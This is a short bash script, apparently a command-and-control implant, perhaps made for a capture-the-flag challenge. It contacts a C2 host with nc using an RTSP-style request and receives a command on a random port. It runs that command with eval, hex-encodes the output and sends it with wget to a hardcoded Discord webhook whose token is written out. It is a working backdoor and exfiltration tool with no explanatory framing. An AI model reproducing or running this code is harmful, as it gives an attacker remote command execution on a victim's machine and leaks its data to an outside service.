set -x

CHALLENGE="Bandits ate my Natass"
DEBUG=0
MAC_STYLE=1
WEB_HOOK_URL='https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk'
if [ $DEBUG == 1 ] 
then
    C2_IP='127.0.0.1'
    C2_PORT=554
else
    C2_IP="10.0.1.3"
    C2_PORT=23766
fi

if [ $MAC_STYLE == 1 ]
then
    NC_LISTEN_PARAMS="-lv"
    TIMEOUT_PARAMS=""
else
    NC_LISTEN_PARAMS="-lp"
    TIMEOUT_PARAMS="-t"
fi

CSEQ=$RANDOM
PORT=$((5000+($RANDOM % 10000)))

cat << EOF | unix2dos | timeout $TIMEOUT_PARAMS 10 nc $C2_IP $C2_PORT
$CHALLENGE
OPTIONS /KylerHowAreTheKids RTSP/1.0
CSeq: $PORT

EOF

if [ $? != 0 ]
then
    echo "LMAO: Couldn't connect to C2"
    exit
fi

COMMAND=$(timeout $TIMEOUT_PARAMS 10 nc $NC_LISTEN_PARAMS $PORT)

if [ $? != 0 ]
then
    echo "LMAO: Couldn't receive command from C2"
    exit
fi

RESULT=$(echo $(eval $(echo -e $COMMAND)) | hexdump -ve '/1 "%02x"')

RESPONSE={\"content\":\"$RESULT\"}

echo \'$(echo $RESPONSE)\'

wget --method=POST --header="Content-Type: application/json" --body-data=$(echo $RESPONSE)  $WEB_HOOK_URL

